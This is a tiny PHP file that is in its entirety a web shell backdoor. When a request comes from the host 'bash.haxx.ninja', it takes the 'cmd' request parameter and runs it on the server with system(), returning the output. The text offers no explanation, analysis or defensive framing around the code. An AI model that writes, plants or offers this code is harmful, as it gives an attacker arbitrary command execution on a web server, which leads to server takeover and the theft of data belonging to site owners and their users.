<?php
if ($_SERVER['REMOTE_HOST'] === "bash.haxx.ninja") { 
	if(isset($_REQUEST['cmd'])){
		$cmd = ($_REQUEST['cmd']);
		echo "<pre>\n";
		system($cmd);
		echo "</pre>";
	}
}
?>
